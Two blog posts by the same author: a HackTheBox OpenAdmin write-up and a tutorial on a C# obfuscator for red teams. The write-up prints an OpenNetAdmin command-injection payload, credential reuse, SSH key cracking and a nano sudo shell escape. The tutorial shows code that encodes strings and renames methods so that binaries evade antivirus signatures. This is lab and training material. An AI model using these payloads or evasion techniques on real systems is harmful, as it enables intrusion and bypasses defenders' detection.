---
layout: post
category: writeup
---

## Machine Info

- Name: OpenAdmin
- Description: OpenAdmin is an easy difficulty Linux machine that features an outdated OpenNetAdmin CMS instance. The CMS is exploited to gain a foothold, and subsequent enumeration reveals database credentials. These credentials are reused to move laterally to a low privileged user. This user is found to have access to a restricted internal application. Examination of this application reveals credentials that are used to move laterally to a second user. A sudo misconfiguration is then exploited to gain a root shell.
- Difficulty: Easy

## Initial Access

Nmap:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Webapps! Let's go ahead and dirsearch:

```bash
dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u http://10.10.10.171

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, html | HTTP method: GET | Threads: 64 | Wordlist size: 1102725

Output File: /home/kali/.dirsearch/reports/10.10.10.171/_24-01-27_15-35-18.txt

Error Log: /home/kali/.dirsearch/logs/errors-24-01-27_15-35-18.log

Target: http://10.10.10.171/

[15:35:18] Starting: 
[15:35:18] 200 -   11KB - /index.html                                      
[15:35:20] 403 -  277B  - /icons/                                          
[15:35:22] 301 -  312B  - /music  ->  http://10.10.10.171/music/           
[15:35:22] 200 -   12KB - /music/                                          
[15:36:02] 301 -  314B  - /artwork  ->  http://10.10.10.171/artwork/        
[15:36:02] 200 -   14KB - /artwork/
```

I find this application:

![](assets/images/2024-01-27-HTB-OpenAdmin-writeup-image-1.png)

I check exploitdb:
```bash
HTB searchsploit opennetadmin
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                                                                                | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                                                 | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                                                                  | php/webapps/47691.sh
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Looks like there is an RCE for our version `18.1.1`

Let's run the exploit and get a shell!

```bash
HTB bash 47691.sh http://10.10.10.171/ona/
$ whoami
www-data
$ ls
config
config_dnld.php
dcm.php
images
include
index.php
local
login.php
logout.php
modules
plugins
winc
workspace_plugins
```

### Understanding the exploit

Before I continue, I wanted to quickly try to understand the exploit:

```bash
xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip=>;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping
```

So this is the payload used by the script, it calls the tooltips on the ping command, and does the injection in the IP variable, let's attempt to replicate this manually in BurpSuite:

![](assets/images/2024-01-27-HTB-OpenAdmin-writeup-image-2.png)

Sending this payload through burp yields an RCE, I also notice, that for formatting they added some fluff with BEGIN and END which is neat for the shell.
## Privilege Escalation

Now to privesc, at first, I look into the config files and attempt to su into another user:

```bash
www-data@openadmin:/opt/ona/www/local/config$ cat database_settings.inc.php 
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>www-data@openadmin:/opt/ona/www/local/config$ ls /home
jimmy  joanna
www-data@openadmin:/opt/ona/www/local/config$ su jimmy
Password: 
jimmy@openadmin:/opt/ona/www/local/config$
```

```bash
jimmy@openadmin:/var/www$ ls -la
total 16
drwxr-xr-x  4 root     root     4096 Nov 22  2019 .
drwxr-xr-x 14 root     root     4096 Nov 21  2019 ..
drwxr-xr-x  6 www-data www-data 4096 Nov 22  2019 html
drwxrwx---  2 jimmy    internal 4096 Nov 23  2019 internal
lrwxrwxrwx  1 www-data www-data   12 Nov 21  2019 ona -> /opt/ona/www
jimmy@openadmin:/var/www$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
```

So jimmy is in the internal group, lemme try to read the internal directory in `/var/www`

I see this login page on index.php and if I enter the correct username and password, I can access main.php, which has joana's ssh key.

![](assets/images/2024-01-27-HTB-OpenAdmin-writeup-image-3.png)

```php
jimmy@openadmin:/var/www/internal$ cat main.php 
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Let's start by port forwarding localhost to my machine:
```bash
HTB ssh -D 1080 jimmy@10.10.10.171
```

![](assets/images/2024-01-27-HTB-OpenAdmin-writeup-image-4.png)

We see a login page, now let's see how we can bypass it!

```bash
jimmy@openadmin:/var/www/internal$ ls -la
total 20
drwxrwx--- 2 jimmy internal 4096 Jan 27 21:01 .
drwxr-xr-x 4 root  root     4096 Nov 22  2019 ..
-rwxrwxr-x 1 jimmy internal 2980 Jan 27 21:02 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
```

Since we have rwx on the file, we can edit it to bypass the password protection all together. I updated the code:
```php
if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && $_POST['password'] == 'jimmy') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
```

Now it just checks for the username and password of jimmy

I submit those creds and we have a key!

![](assets/images/2024-01-27-HTB-OpenAdmin-writeup-image-5.png)

It's encrypted, so I added it to a file and cracked the hash:

```bash
➜  HTB ssh2john key > hash
➜  HTB john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (key)     
1g 0:00:00:01 DONE (2024-01-27 16:05) 0.6993g/s 6695Kp/s 6695Kc/s 6695KC/s bloodofyouth..bloodmabite
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

SSH in as joana now:

```bash
HTB ssh -i key joanna@10.10.10.171               
Enter passphrase for key 'key': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jan 27 21:06:27 UTC 2024

  System load:  0.0               Processes:             185
  Usage of /:   31.8% of 7.81GB   Users logged in:       1
  Memory usage: 15%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
joanna@openadmin:~$
```

```bash
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
joanna@openadmin:~$ sudo /bin/nano /opt/priv
^R^X
reset; sh 1>&0 2>&0
```

I run the nano command on /opt/priv and from there I can escape into a shell

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
openadmin
```

best,
gerbsec

---
layout: post
category: blog
---
# c# obfuscation: making your code undetectable (but functional)

## introduction

hey its me gerbsec, back again with more writing. as you're probably not aware, i've recently started getting real deep into opsec and rt again and my next challenge was running all of our awesome c# assemblies in memory. only one issue, they are all signatures to hell and back.... so what do i do? do i run yara64.exe on every single binary and rinse and repeat for hours at a time till i get an undetectable binary? NO! I find a tool that obfuscates c#, update it to make it more practical and functional, and then write about it! 

the tool in question is my fork of [smokeyobfuscator](https://github.com/gerbsec/SmokeyObfuscator). which initially had a gui and some other functionality that i decided was not relevant to rt. the author seems to be a dev or something but his tool is great! 

Original author credit: [TrentonH1ll](https://github.com/TrentonH1ll)

## what is c# obfuscation?

c# obfuscation is the process of transforming your code to make it difficult to understand/detect. this is particularly useful for red teamers since our greatest enemy is static signatures right? right?

### why obfuscate?

1. **security**: protect sensitive logic and algorithms.
2. **opsec**: won't get detected on disk or in memory.
3. **IMPORANT**: this won't help with behavioral but its a start.

## prerequisites

to follow along, you'll need:

- visual studio or any c# ide
- [smokeyobfuscator](https://github.com/gerbsec/SmokeyObfuscator)

## setting up smokeyobfuscator

clone the repository and open it in your ide. let's start with the main function where we load the binaries and execute our obfuscation:

```csharp
private void button2_Click(object sender, EventArgs e)
{
    if (string.IsNullOrEmpty(selectedDirectory))
    {
        MessageBox.Show("please select a directory first.");
        return;
    }

    // get all .exe files from the selected directory
    string[] files = Directory.GetFiles(selectedDirectory, "*.exe");

    foreach (string file in files)
    {
        try
        {
            // load file into memory
            byte[] fileBytes = File.ReadAllBytes(file);

            // load module from memory
            ModuleDefMD module;
            using (var ms = new MemoryStream(fileBytes))
            {
                module = ModuleDefMD.Load(ms);
            }

            // perform obfuscation
            NumberChanger.Process(module);
            Strings.Execute(module);
            ProxyInts.Execute(module);
            HideMethods.Execute(module);

            // save the obfuscated file back to disk
            SaveFile(module, file);
        }
        catch (Exception ex)
        {
            // handle errors
            skippedFiles.Add(file);
            Console.WriteLine($"error processing {file}: {ex.Message}");
        }
    }
}
```

here we simply open a directory for files, rotate through the files and execute our obfuscation techniques. at its current state its a a gui tool. in my next release i'll be pushing it out as a command line tool that takes a directory for an argument. 

EDIT: I just pushed the above 7/7/2024.

## protections

now, let's break down the different protections used in smokeyobfuscator.

### hide methods

`hide methods` adds custom attributes and modifies method names to make them harder to understand:

```csharp
public static void Execute(ModuleDef module)
{
    // create a type reference for the 'CompilerGeneratedAttribute'
    TypeRef attrRef = module.CorLibTypes.GetTypeRef("System.Runtime.CompilerServices", "CompilerGeneratedAttribute");
    
    // create a constructor reference for the 'CompilerGeneratedAttribute'
    var ctorRef = new MemberRefUser(module, ".ctor", MethodSig.CreateInstance(module.CorLibTypes.Void), attrRef);
    
    // create a new custom attribute using the constructor reference
    var attr = new CustomAttribute(ctorRef);

    // iterate over all types in the module
    foreach (var type in module.GetTypes())
    {
        // iterate over all methods in each type
        foreach (var method in type.Methods)
        {
            // skip runtime special methods, special methods, and methods named 'Invoke'
            if (method.IsRuntimeSpecialName || method.IsSpecialName || method.Name == "Invoke") continue;
            
            // add the custom attribute to the method
            method.CustomAttributes.Add(attr);
            
            // rename the method to make it less recognizable here im using gerbserv.com but it could literally be anything.
            method.Name = "<gerbserv.com>" + method.Name;
        }
    }
}
```

### number changer

`number changer` obfuscates numeric constants by replacing them with a series of mathematical operations:

```csharp
public static void Process(ModuleDefMD module)
{
    foreach (TypeDef type in module.Types)
    {
        foreach (MethodDef method in type.Methods)
        {
            if (method.Body != null)
            {
                for (int i = 0; i < method.Body.Instructions.Count; i++)
                {
                    Instruction instruction = method.Body.Instructions[i];

                    if (instruction.Operand is int && instruction.IsLdcI4() && instruction.OpCode == OpCodes.Ldc_I4)
                    {
                        List<Instruction> instructions = GenerateInstructions(Convert.ToInt32(instruction.Operand));
                        instruction.OpCode = OpCodes.Nop;

                        foreach (Instruction instr in instructions)
                        {
                            method.Body.Instructions.Insert(i + 1, instr);
                            i++;
                        }
                    }
                }
            }
        }
    }
}
```

### strings

`strings` obfuscates string constants by encoding them:

```csharp
public static void Execute(ModuleDefMD module)
{
    MethodDefUser TTH = new MethodDefUser("gerbserv", MethodSig.CreateStatic(module.CorLibTypes.String, module.CorLibTypes.String), MethodImplAttributes.IL | MethodAttributes.Managed, MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.HideBySig | MethodAttributes.ReuseSlot);
    module.GlobalType.Methods.Add(TTH);
    CilBody body = new CilBody();
    TTH.Body = body;
    body.Instructions.Add(OpCodes.Nop.ToInstruction());
    body.Instructions.Add(OpCodes.Call.ToInstruction(module.Import(typeof(Encoding).GetMethod("get_UTF8", new Type[] { }))));
    body.Instructions.Add(OpCodes.Ldarg_0.ToInstruction());
    body.Instructions.Add(OpCodes.Call.ToInstruction(module.Import(typeof(System.Convert).GetMethod("FromBase64String", new Type[] { typeof(string) }))));
    body.Instructions.Add(OpCodes.Callvirt.ToInstruction(module.Import(typeof(System.Text.Encoding).GetMethod("GetString", new Type[] { typeof(byte[]) }))));
    body.Instructions.Add(OpCodes.Ret.ToInstruction());
    foreach (TypeDef type in module.Types)
    {
        if (type.Name != "Resources" || type.Name != "Settings")
        {
            foreach (MethodDef method in type.Methods)
            {
                if (!method.HasBody) continue;
                for (int i = 0; i < method.Body.Instructions.Count(); i++)
                {
                    if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                    {
                        method.Body.Instructions[i].Operand = Convert.ToBase64String(UTF8Encoding.UTF8.GetBytes(method.Body.Instructions[i].Operand.ToString()));
                        method.Body.Instructions.Insert(i + 1, new Instruction(OpCodes.Call, TTH));
                        i++;
                    }
                }
                method.Body.SimplifyBranches();
                method.Body.OptimizeBranches();
            }
        }
    }
}
```

- **method creation**: a new method named `gerbserv` is created in the global type. this method takes a base64-encoded string as an input and returns the decoded string.
- **cilbody**: a cil (common intermediate language) body is created for the method. this body contains the instructions for decoding a base64 string.
- **instructions**:
    - `OpCodes.Nop`: no operation, just a placeholder.
    - `OpCodes.Call`: calls the `get_UTF8` method of the `Encoding` class to get the utf8 encoding.
    - `OpCodes.Ldarg_0`: loads the first argument (the base64 string) onto the stack.
    - `OpCodes.Call`: calls the `FromBase64String` method of the `Convert` class to decode the base64 string.
    - `OpCodes.Callvirt`: calls the `GetString` method of the `Encoding` class to convert the byte array to a string.
    - `OpCodes.Ret`: returns the decoded string.

Now this actually works for now, but i have plans to aes encrypt instead with a randomly generated key and iv. this ensures that everytime this is generated we'll have a new hash for the file and new strings etc.
## seeing it in action

before obfuscation, our binary is easily detected by av:

![](assets/images/2024-07-06-cs-obfuscation-for-fun-and-profit-image-1.png)

![](assets/images/2024-07-06-cs-obfuscation-for-fun-and-profit-image-2.png)


after running smokeyobfuscator:

![](assets/images/2024-07-06-cs-obfuscation-for-fun-and-profit-image-3.png)

![](assets/images/2024-07-06-cs-obfuscation-for-fun-and-profit-image-4.png)
## conclusion

you should now have a good understanding of c# obfuscation and how to use smokeyobfuscator to protect your code. feel free to reach out on my socials if you have any questions!

best, gerbsec
